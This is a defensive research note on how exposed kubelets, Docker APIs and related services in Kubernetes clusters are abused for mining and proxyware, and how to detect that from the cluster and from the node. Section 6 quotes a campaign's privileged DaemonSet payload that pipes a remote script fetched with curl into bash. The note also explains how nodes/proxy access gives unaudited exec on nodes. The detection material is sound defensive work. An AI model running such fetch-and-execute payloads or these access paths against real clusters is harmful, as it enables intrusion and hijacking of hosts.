# Kubernetes and container squatting: exposed kubelets, Docker APIs, and what the node sees that the cluster does not

Scope: how a server running kubelet or dockerd becomes squatting infrastructure without any
application exploit — the control-plane ports that ship open, the objects that grant host access,
the registry as a distribution channel, and the split between what a cluster-side query can prove and
what only the node can. Written for one operator with `kubectl` on a laptop and `root` on a node: no
SIEM, no agent, no paid product.

---

## Summary

- **Kubelet has two default sets and only one is safe.** `KubeletConfiguration` defaults to
  `anonymous.enabled: false`, `authorization.mode: Webhook`, `readOnlyPort: 0`
  ([ref](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/)), but
  `applyLegacyDefaults()` in `cmd/kubelet/app/options/options.go` forces `anonymous=true`,
  `AlwaysAllow` and `read-only-port=10255` on **flag-only** kubelets
  ([options.go](https://raw.githubusercontent.com/kubernetes/kubernetes/master/cmd/kubelet/app/options/options.go)).
  No `--config` means anonymous-and-AlwaysAllow; kubeadm is not.
- **`nodes/proxy` GET is remote code execution.** Kubernetes' own docs say `get` on `nodes/proxy`
  "authorizes executing commands in any container running on the node", and that direct kubelet
  traffic "is not logged by Kubernetes audit logging"
  ([bypass risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)).
- **Exposure is measured.** Trend Micro's 2022-04-19 Shodan sweep found **243,469** clusters with
  10250 visible, ~3,500 answering anonymous requests with `403` and a smaller set with `200` + pod
  lists ([Trend Micro](https://www.trendmicro.com/en_us/research/22/e/the-fault-in-our-kubelets-analyzing-the-security-of-publicly-exposed-kubernetes-clusters.html)).
  Shadowserver saw **381,645** IPs return `200` to `GET /version` out of **454,729** on 2022-05-16
  (**84 %**) ([Shadowserver](https://www.shadowserver.org/news/over-380-000-open-kubernetes-api-servers/)).
- **Docker's TCP socket is unauthenticated unless you add TLS**: "the Docker daemon provides
  un-encrypted and un-authenticated direct access"; 2375 plaintext, 2376 encrypted
  ([dockerd](https://docs.docker.com/reference/cli/dockerd/)).
- **The registry is the payload channel.** Unit 42: **30** images, **10** accounts, **20 million**
  pulls, ~**US$200,000** mined, **90.3 %** Monero
  ([Unit 42](https://unit42.paloaltonetworks.com/malicious-cryptojacking-images)). Flare: **64**
  images, **6,498,377** pulls, **zero** stars
  ([Flare](https://flare.io/learn/resources/blog/cryptomining-supply-chain-abuse-docker-hub-malware)).
- **The modern pattern is proxyware, not just miners.** TeamPCP (Dec 2025) ships `proxy.sh` with
  **FRPS** and **gost**, then a **privileged DaemonSet that mounts the host filesystem**
  ([Wiz](https://threats.wiz.io/all-incidents/teampcp-cloud-native-campaign-targeting-exposed-control-planes),
  [Flare](https://flare.io/learn/resources/blog/teampcp-cloud-native-ransomware)).
- **The cgroup path is the join key.** `{"kubepods","burstable","pod1234-abcd-…"}` becomes
  `/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod1234_abcd_….slice` via
  `strings.Replace(part, "-", "_", -1)`
  ([cgroup_manager_linux.go](https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/cm/cgroup_manager_linux.go)).
- **kubelet has no audit log** — "audit" appears **zero** times in its CLI reference
  ([ref](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)). The substitute
  is `-v=3`: `httplog.WithLogging` logs every request at `withLoggingLevel = 3`
  ([httplog.go](https://raw.githubusercontent.com/kubernetes/kubernetes/master/staging/src/k8s.io/apiserver/pkg/server/httplog/httplog.go)),
  and `kubelet_http_requests_total{path,server_type}` counts them per endpoint.

---

## 1. The port map

| Port (process) | Default binding | Auth out of the box |
|---|---|---|
| **10250** kubelet, secure API | `--address` `0.0.0.0` ([ref](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)) | flag-only: anonymous + `AlwaysAllow` |
| **10255** kubelet, read-only | `0` in config; **10255** via `applyLegacyDefaults` | none |
| **10248** kubelet healthz | **10248** ([ports.go](https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/cluster/ports/ports.go)) | none |
| **2375/2376** Docker Engine API | unix socket unless `-H tcp://…` | none / TLS-optional |
| **2379/2380** etcd client/peer | `http://localhost:2379` ([etcd](https://etcd.io/docs/v3.5/op-guide/configuration/)) | `--client-cert-auth false` |
| **6443** kube-apiserver | `--secure-port` **6443** ([ref](https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/)) | RBAC; `/version` anonymous |
| **6379** Redis | `bind 127.0.0.1 -::1`, `protected-mode yes` ([redis.conf](https://raw.githubusercontent.com/redis/redis/7.4/redis.conf)) | none |
| **8983** Solr | `-p 8983` ([Solr](https://solr.apache.org/guide/solr/latest/deployment-guide/taking-solr-to-production.html)) | none |

## 2. Kubelet: which default applies, and the endpoints that matter

`applyLegacyDefaults` runs "before the first round of flag parsing" to "preserve the command line
API". So "is my kubelet anonymous?" is not a version question — it is whether `--config` was passed:

```sh
# the only authoritative answer on a node
grep -E 'anonymous|authorization|readOnlyPort|staticPodPath' /var/lib/kubelet/config.yaml
cat /var/lib/kubelet/kubeadm-flags.env 2>/dev/null
ps -o args= -C kubelet
```

`kubeadm` writes a `KubeletConfiguration` with `authentication.anonymous.enabled: false` and
`authorization.mode: Webhook`; hand-rolled setups — k3s variants, kubelet-in-a-systemd-unit
tutorials, a `--anonymous-auth=true` quick fix — land on the legacy path.

The endpoint surface, from `pkg/kubelet/server/server.go`: `/pods`, `/runningpods`, `/stats/`,
`/metrics`, `/metrics/cadvisor`, `/metrics/resource`, `/metrics/probes`, `/healthz`, `/configz`, and —
only when `enableDebuggingHandlers` is on (default `true`) — `/run`, `/exec`, `/attach`,
`/portForward`, `/containerLogs`, `/logs/`, `/debug/pprof`. `/run` is `POST
/run/{namespace}/{pod}/{container}`, registered only in `InstallAuthRequiredHandlers`
([server.go](https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go)).
The read-only server passes `auth=nil, kubeCfg=nil`, so it installs only `/healthz`, `/pods`,
`/stats/`, `/metrics` (plus cAdvisor metrics) — enough to enumerate every pod on the node, which is
why 10255 shows up in scans.

When authorization is delegated to the API server, the kubelet maps paths to RBAC attributes
([kubelet-authn-authz](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)):

| Kubelet path | resource | subresource |
|---|---|---|
| `/stats/*` | nodes | stats |
| `/metrics/*` | nodes | metrics |
| `/logs/*` | nodes | log |
| `/spec/*` | nodes | spec |
| everything else (`/run`, `/exec`, `/pods`, …) | nodes | **proxy** |

Fine-grained authorization (`KubeletFineGrainedAuthz`, alpha v1.32, **stable v1.36**) narrows
`/pods`, `/runningPods`, `/configz`, `/healthz` to their own subresources; under the classic model
they all fall through to `proxy`. A ClusterRole with `resources: ["nodes/proxy"]`,
`verbs: ["get"]`, bound to a ServiceAccount whose token sits in a pod, is a node-wide exec grant —
the highest-value RBAC finding in any cluster.

## 3. Docker Engine API on 2375/2376

`/var/run/docker.sock` is a "non-networked UNIX socket"; a TCP listener exists only if someone added
`-H tcp://0.0.0.0:2375`, and in that mode the daemon "provides un-encrypted and un-authenticated
direct access" ([dockerd reference](https://docs.docker.com/reference/cli/dockerd/)). TLS is opt-in
via `--tlsverify`, which *requires* a CA and per-client certs
([protect-access](https://docs.docker.com/engine/security/protect-access/)); the common failure is
`--tls` without `--tlsverify`, or a CA whose client cert went to everyone who asked. Anyone with the
socket is root-equivalent, and Docker documents that group membership grants the same
([linux-postinstall](https://docs.docker.com/engine/install/linux-postinstall/)). Useful endpoints
are the read-only ones: `GET /version` (what Shadowserver probes), `/containers/json?all=1`,
`/containers/{id}/json`, `/images/json`, `/events`.

Identity of the workload matters: since Kubernetes **v1.24** removed dockershim
([Dockershim FAQ](https://kubernetes.io/blog/2022/02/17/dockershim-faq/)), any container that appears
in `docker ps` but not in `crictl ps` was started by something other than kubelet — a five-second
check.

Documented use, at reporting level: Aqua (2020) tracked months of automated abuse of open Docker
daemon ports, with an identical entrypoint in every attempt apart from the payload IP
([Aqua](https://www.aquasec.com/blog/threat-alert-kinsing-malware-container-vulnerability)); Unit 42
found ~5,000 exposed daemons on Shodan/Censys in Sep–Dec 2019, "10-15 % … can be accessed without
authentication", resolving to **1,400** unique unsecured hosts, **8,673** containers, **17,927**
images, **15,229** volumes
([Unit 42](https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed)).
Shadowserver's daily `scan_docker` report probes `GET /version` on 2375: **551** accessible services
on 2022-07-04, **290** tagged CVE-2019-5736
([Shadowserver](https://www.shadowserver.org/what-we-do/network-reporting/accessible-docker-service-report/)).

## 4. Redis, etcd and Solr as initial access

Not Kubernetes components — the "data services in the same namespace" that got a `LoadBalancer`
Service because that was the fastest way to make them reachable.

- **Redis** ships `bind 127.0.0.1 -::1`, `protected-mode yes`, no `requirepass`
  ([redis.conf](https://raw.githubusercontent.com/redis/redis/7.4/redis.conf)); the unsafe state is a
  deliberate edit — `bind 0.0.0.0` for a cross-namespace client — not a default.
- **etcd** defaults to `--listen-client-urls http://localhost:2379`, `--client-cert-auth false`
  ([etcd config](https://etcd.io/docs/v3.5/op-guide/configuration/)). Kubernetes' docs: there is "no
  widely accepted implementation of authorization for the etcd API", so "any certificate with client
  access to etcd can be used to gain full access", and direct etcd access "is not subject to
  Kubernetes admission control and is not logged by Kubernetes audit logging"
  ([bypass risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)).
- **Solr** on 8983 without an auth plugin exposes an admin surface; the guide says "Solr is not
designed to be exposed on the open internet"
  ([Solr guide](https://solr.apache.org/guide/solr/latest/deployment-guide/taking-solr-to-production.html)).

TeamPCP's initial-access list is exactly this set — exposed Docker APIs, Kubernetes APIs, Ray
dashboards, Redis, CVE-2025-29927 in React/Next.js
([Flare](https://flare.io/learn/resources/blog/teampcp-cloud-native-ransomware)). Microsoft's 2025
report says the same generically: services "that do not use authentication by default and are not
intended to be exposed", naming Weave Scope and Apache NiFi
([Microsoft](https://www.microsoft.com/en-us/security/blog/2025/04/23/understanding-the-threat-landscape-for-kubernetes-and-containerized-assets)).

## 5. The registry as a distribution channel

Two economies ride on public images:

1. **Miners baked in.** Unit 42: 30 images / 10 accounts / 20M pulls / ~US$200,000, Monero 90.3 %,
   Grin 6.5 %, Arionum 3.2 % ([Unit 42](https://unit42.paloaltonetworks.com/malicious-cryptojacking-images)).
   Flare: 64 images named `<hex-namespace>/<technology-name>:<hex-tag>`, uploaded 2021-06-26 →
   2021-09-15, **6,498,377** pulls, **0** stars, ~314 MB each; plus 10 AI-themed images
   (`tensor-train-vis`, `ai-train`, `predict`) with **31,462** pulls
   ([Flare](https://flare.io/learn/resources/blog/cryptomining-supply-chain-abuse-docker-hub-malware)).
2. **Proxyware as a service.** Vendors ship their own images — `honeygain/honeygain` advertises 5M+
   pulls and the vendor documents running it in Docker
   ([Docker Hub](https://hub.docker.com/r/honeygain/honeygain),
   [docs](https://support.honeygain.com/hc/en-us/articles/30688479267868-How-to-run-Honeygain-on-Docker-Linux)).
   So "a proxyware image is running" is not proof of compromise; the question is who authorised it.

Pull counts are not a signal: the 64-image cluster had 6.5M pulls and zero stars, which is exactly
what a scheduled CI pull looks like. Digests are — `/var/lib/containerd` holds what ran, while the
API object only records the tag that was requested.

## 6. Pod primitives, and the DaemonSet pattern

| Field | What it actually grants | Legitimate users (false positives) |
|---|---|---|
| `hostNetwork: true` | the pod's sockets are the node's sockets; `ss` on the host sees them | CNI (calico-node, cilium), kube-proxy, node-exporter, ingress |
| `hostPID: true` | see and signal every process on the node; `nsenter` any netns | node-exporter, log shippers, falco |
| `hostPath` | a node directory, writable unless `readOnly: true` | CSI drivers (`/var/lib/kubelet`), node-exporter (`/proc`, `/sys`), fluent-bit (`/var/log`) |
| `privileged: true` | all capabilities, all devices, no seccomp/AppArmor constraint | CNI, GPU device plugins, module loaders |

The DaemonSet is the delivery mechanism: one object fans out to every node, and `hostPath: /` inside a
privileged pod turns the cluster into a host botnet. TeamPCP's `kube.py` builds exactly that — a
`DaemonSet` with `privileged: true` mounting the host path, payload `apk add curl bash python3;
curl -fsSL {PROXY_URL} | bash; sleep infinity`
([Flare](https://flare.io/learn/resources/blog/teampcp-cloud-native-ransomware);
[Wiz](https://threats.wiz.io/all-incidents/teampcp-cloud-native-campaign-targeting-exposed-control-planes)
calls it "a privileged DaemonSet that mounts the host filesystem"). It needs only `create` on
`daemonsets` in `apps`, or `create` on `pods` in a namespace without Pod Security
`baseline`/`restricted`.

## 7. cgroup layout per pod — the join key

`GetPodCgroupNameSuffix` returns `pod` + the pod UID, and the systemd driver rewrites `-` to `_`:

```
{"kubepods", "burstable", "pod1234-abcd-5678-efgh"}
  → /kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod1234_abcd_5678_efgh.slice
```

(comment at `pkg/kubelet/cm/cgroup_manager_linux.go`; `strings.Replace(part, "-", "_", -1)` is the
mapping). Burstable and BestEffort pods sit under their own `.slice`; **Guaranteed** pods go straight to
`kubepods-pod<uid>.slice`. The container level appends the runtime's scope —
`cri-containerd-<id>.scope`, `crio-<id>.scope`, or `docker-<id>.scope` for the pre-1.24 dockershim.
With the `cgroupfs` driver (`cgroupDriver` default `"cgroupfs"`,
[ref](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/)) the tree is plain
directories: `/sys/fs/cgroup/kubepods/burstable/pod<uid>/<containerid>`.

Top CPU by pod, cgroup v2, no extra packages:

```sh
for f in /sys/fs/cgroup/kubepods.slice/kubepods-*.slice/kubepods-*-pod*.slice/cpu.stat; do
  awk -v p="$f" '/^usage_usec/{printf "%14d %s\n", $2, p}' "$f"
done | sort -rn | head -10
```

cgroup v1 equivalent: `/sys/fs/cgroup/cpu,cpuacct/kubepods/<qos>/pod<uid>/cpuacct.usage` (nanoseconds).

## 8. Detection from the cluster

Object queries, no jq:

```sh
# 1. every pod that touches the host
kubectl get pods -A -o custom-columns=\
'NS:.metadata.namespace,POD:.metadata.name,NODE:.spec.nodeName,HOSTNET:.spec.hostNetwork,HOSTPID:.spec.hostPID,PRIV:.spec.containers[*].securityContext.privileged,HOSTPATH:.spec.volumes[*].hostPath.path' \
| awk 'NR==1 || $4=="true" || $5=="true" || $6=="true" || $7!="<none>"'

# 2. every DaemonSet and its image, across all namespaces
kubectl get ds -A -o custom-columns=\
'NS:.metadata.namespace,NAME:.metadata.name,DESIRED:.status.desiredNumberScheduled,READY:.status.numberReady,IMAGE:.spec.template.spec.containers[*].image'

# 3. who can reach nodes/proxy, pods/exec, or "*"
kubectl get clusterroles -o json | python3 -c '
import json,sys
for cr in json.load(sys.stdin)["items"]:
    for r in cr.get("rules") or []:
        res = set(r.get("resources") or [])
        if res & {"nodes/proxy","pods/exec","pods/attach","*"}:
            print(cr["metadata"]["name"], r.get("verbs"), sorted(res))
'
```

Answer "who holds it" with `jsonpath`, not a second tool:

```sh
kubectl get clusterrolebindings -o jsonpath=\
'{range .items[?(@.roleRef.name=="<role-from-step-3>")]}{.metadata.name}{"\t"}{.subjects[*].kind}/{.subjects[*].name}{"\n"}{end}'
```

`kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>` prints a workload identity's
effective rules.

### Audit logging

The API server logs nothing unless `--audit-policy-file` is set — "If the flag is omitted, no events
are logged" — and a policy with zero rules is illegal
([audit docs](https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/)). A policy aimed here:

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
omitStages: ["RequestReceived"]
rules:
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["pods/exec", "pods/attach", "pods/portforward", "nodes/proxy"]
  - level: Request
    verbs: ["create", "update", "patch", "delete"]
    resources:
      - group: "apps"
        resources: ["daemonsets", "deployments", "statefulsets"]
      - group: ""
        resources: ["pods", "serviceaccounts", "secrets"]
  - level: Metadata
    resources:
      - group: "rbac.authorization.k8s.io"
        resources: ["clusterrolebindings", "rolebindings"]
  - level: Metadata
    omitStages: ["RequestReceived"]
```

Written with `--audit-log-path` (the log backend; `--audit-log-maxage`, `--audit-log-maxbackup`,
`--audit-log-maxsize` bound retention), events are JSON lines, so `grep` is enough:

```sh
grep '"subresource":"exec"'    /var/log/kubernetes/audit/audit.log | grep '"verb":"create"'
grep '"subresource":"proxy"'   /var/log/kubernetes/audit/audit.log | grep '"verb":"get"'
grep '"resource":"daemonsets"' /var/log/kubernetes/audit/audit.log | grep '"verb":"create"'
grep '"username":"system:anonymous"' /var/log/kubernetes/audit/audit.log
```

Remember what this log does *not* hold: any request that went straight to a kubelet, or straight to
etcd. Kubernetes documents both as "not logged by Kubernetes audit logging"
([bypass risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)).

## 9. Detection from the node — and what only the node can see

```sh
# kubelet request log: no audit subsystem, but httplog fires at -v=3
journalctl -u kubelet --since -24h | grep 'URI=' | grep -E 'URI="/(run|exec|attach|pods)' | tail

# per-endpoint request counters
curl -s http://127.0.0.1:10255/metrics | grep kubelet_http_requests_total
curl -sk --cert /var/lib/kubelet/pki/kubelet-client-current.pem \
        --key  /var/lib/kubelet/pki/kubelet-client-current.pem \
        https://127.0.0.1:10250/metrics | grep -E 'kubelet_http_requests_total|kubelet_websocket_streaming_requests_total'
```

`kubelet_http_requests_total` carries `{method, path, server_type, long_running}`, `path` being the
first URI segment (`exec`, `run`, `pods`, `metrics/cadvisor`) per `getURLRootPath`;
`server_type="readonly"` proves the unauthenticated port is being used, and
`kubelet_websocket_streaming_requests_total{subresource="exec"}` counts streaming execs
([metrics.go](https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/metrics/metrics.go)).

| Question | Cluster can answer | Node can answer |
|---|---|---|
| Which pods exist? | only objects in etcd | also static pods with a bad namespace (no mirror pod) and containers started by `docker`/`crictl` directly |
| What did the process run? | no — `pods/exec` audit records the connection, not argv | `/proc/<pid>/cmdline`, `cwd`, `/proc/<pid>/exe` (plus " (deleted)") |
| CPU per pod, right now? | only via metrics-server sampling | `cpu.stat` `usage_usec`, 1 s granularity |
| What was written through a `hostPath`? | no | the files, e.g. under `/var/lib/kubelet/pods/<uid>/volumes/` |
| Is anonymous auth on? | no | `/var/lib/kubelet/config.yaml` |
| Exec'd directly into the kubelet? | **no** — not in audit | `-v=3` log and `kubelet_http_requests_total{path="exec"}` |

```sh
# pid -> pod cgroup
grep -H kubepods /proc/[0-9]*/cgroup 2>/dev/null | head

# orphan check: runtime's containers vs the cluster's objects
crictl ps -a --no-trunc -o json | python3 -c 'import json,sys;[print(c["id"],c["metadata"]["name"],c["imageRef"]) for c in json.load(sys.stdin)["containers"]]'
kubectl get pods -A -o custom-columns='UID:.metadata.uid,NS:.metadata.namespace,NAME:.metadata.name'
```

A stale `/sys/fs/cgroup/kubepods-*` directory with an empty `cgroup.procs` is a leftover; one with a
live pid and no matching API object is the finding.

## 10. Detection recipe (cheapest first)

1. **`ss -lntp` on each node** (~1 s, iproute2). Look for 2375/2376/2379/2380/8983 on anything but
   `127.0.0.1`, and 10255 at all. Fallback: `/proc/net/tcp`, port column in hex — 2375 = `0947`,
   10250 = `280A`, 10255 = `280F`, 2379 = `094B`, 8983 = `2317`, 6443 = `192B`.
2. **Read the kubelet's config**: `grep -E 'anonymous|authorization|readOnlyPort' /var/lib/kubelet/config.yaml`.
   No file = flag-only = legacy defaults.
3. **`curl -s http://127.0.0.1:2375/version`** — an answer means the daemon is on TCP.
4. **The object sweep** from §8, and the audit grep from §8 if `--audit-policy-file` is set.
5. **cgroup top-10** from §7, diffed against `kubectl top pods -A`.
6. **`kubelet_http_requests_total`** — the only place a direct-to-kubelet exec is counted.

False-positive modes, named before anyone gets paged:

- **`hostNetwork` + `hostPath` are the normal shape of every CNI and node agent** — calico-node,
  cilium, kube-proxy, node-exporter, the CSI node plugin, fluent-bit. Diff against last week's output
  rather than an absolute list.
- **`privileged: true` is mandatory for GPU device plugins and eBPF agents** that load kernel modules.
- **CPU spikes are not mining.** Unpacking, builds and JIT warm-up burn a core for minutes; a miner
  is a *flat* plateau at a fixed fraction of the limit, for hours, on an image you cannot attribute.
- **10250 bound to `0.0.0.0` is the default**; reachability from outside the security group is the
  finding. Check the cloud firewall, not `ss`.
- **Orphan cgroups.** Terminated pods leave `kubepods-*` directories; check `cgroup.procs` first.
- **`docker ps` on a modern node is normally empty** (dockershim removed in v1.24); a populated one
  means an old cluster or a second runtime nobody told you about.

ATT&CK: T1610 Deploy a Container, T1611 Escape to Host, T1609 Container Administration Command,
T1613 Container and Resource Discovery, T1496.002 Bandwidth Hijacking
([T1611](https://attack.mitre.org/techniques/T1611), [T1609](https://attack.mitre.org/techniques/T1609),
[T1496.002](https://attack.mitre.org/techniques/T1496/002/)).

---

## Sources

Kubernetes: kubelet CLI reference <https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/> ·
kubelet config v1beta1 <https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/> ·
kubelet authn/authz <https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/> ·
API server bypass risks <https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/> ·
audit logging <https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/> ·
kube-apiserver reference <https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/> ·
dockershim removal FAQ <https://kubernetes.io/blog/2022/02/17/dockershim-faq/>

Kubernetes source (`raw.githubusercontent.com/kubernetes/kubernetes/master/…` prefix omitted once):
`cmd/kubelet/app/options/options.go`, `pkg/kubelet/apis/config/v1beta1/defaults.go`,
`pkg/kubelet/cm/cgroup_manager_linux.go`, `pkg/kubelet/cm/helpers_linux.go`,
`pkg/kubelet/server/server.go`, `pkg/kubelet/server/metrics/metrics.go`, `pkg/cluster/ports/ports.go`,
`staging/src/k8s.io/apiserver/pkg/server/httplog/httplog.go` — each at
<https://raw.githubusercontent.com/kubernetes/kubernetes/master/> + the path above.

Docker: dockerd reference <https://docs.docker.com/reference/cli/dockerd/> ·
protect the daemon socket <https://docs.docker.com/engine/security/protect-access/> ·
linux post-install <https://docs.docker.com/engine/install/linux-postinstall/>

Data services: redis.conf 7.4 <https://raw.githubusercontent.com/redis/redis/7.4/redis.conf> ·
etcd configuration <https://etcd.io/docs/v3.5/op-guide/configuration/> ·
Solr production guide <https://solr.apache.org/guide/solr/latest/deployment-guide/taking-solr-to-production.html>

Threat intel: Trend Micro "Fault in our Kubelets"
<https://www.trendmicro.com/en_us/research/22/e/the-fault-in-our-kubelets-analyzing-the-security-of-publicly-exposed-kubernetes-clusters.html> ·
Shadowserver 380k Kubernetes APIs <https://www.shadowserver.org/news/over-380-000-open-kubernetes-api-servers/> ·
Shadowserver Kubernetes report <https://www.shadowserver.org/what-we-do/network-reporting/accessible-kubernetes-api-server-report/> ·
Shadowserver Docker report <https://www.shadowserver.org/what-we-do/network-reporting/accessible-docker-service-report/> ·
Unit 42 Docker daemons <https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed> ·
Unit 42 "20 Million Miners" <https://unit42.paloaltonetworks.com/malicious-cryptojacking-images> ·
Flare Docker Hub cryptomining <https://flare.io/learn/resources/blog/cryptomining-supply-chain-abuse-docker-hub-malware> ·
Flare TeamPCP <https://flare.io/learn/resources/blog/teampcp-cloud-native-ransomware> ·
Wiz TeamPCP <https://threats.wiz.io/all-incidents/teampcp-cloud-native-campaign-targeting-exposed-control-planes> ·
Aqua Kinsing <https://www.aquasec.com/blog/threat-alert-kinsing-malware-container-vulnerability> ·
Microsoft K8s/container threat landscape <https://www.microsoft.com/en-us/security/blog/2025/04/23/understanding-the-threat-landscape-for-kubernetes-and-containerized-assets>

Registry: honeygain/honeygain on Docker Hub <https://hub.docker.com/r/honeygain/honeygain> ·
Honeygain Docker instructions <https://support.honeygain.com/hc/en-us/articles/30688479267868-How-to-run-Honeygain-on-Docker-Linux>

## What I could not verify

1. **Ordering of `applyLegacyDefaults` versus config-file defaults.** Both are source-verified, but I
   did not trace a running kubelet to confirm that a `--config` omitting `authentication.anonymous`
   ends up `false` while a bare kubelet ends up `true`. Verify on the node with `/configz`.
2. **Whether kubelet's `-v=3` httplog line is on by default anywhere.** The level is a source
   constant (`withLoggingLevel = 3`); distro kubelet units usually pass `--v=2`.
3. **The runtime side of the cgroup scope names** (`cri-containerd-`, `crio-`, `docker-`). The kubelet
   half of the mapping is source-verified; the runtime half is convention, not a normative document.
4. **cAdvisor's `id` label carrying the full cgroup path** — widely observed, not stated normatively
   upstream, so the §7 recipe uses `cpu.stat` instead.
5. **Trend Micro's `200 OK` count** is in a figure I could not read as text; only the ~3,500 (403)
   and ~76,000 (no response) numbers appear in prose. Shadowserver's page is dated 2023-12-11 and
   quotes 2022-07-04 figures — current dashboard numbers are unretrieved.
6. **TeamPCP dating.** Wiz dates it Feb 2026, Flare Dec 2025; I report both without reconciling them
   and verified no victim count.
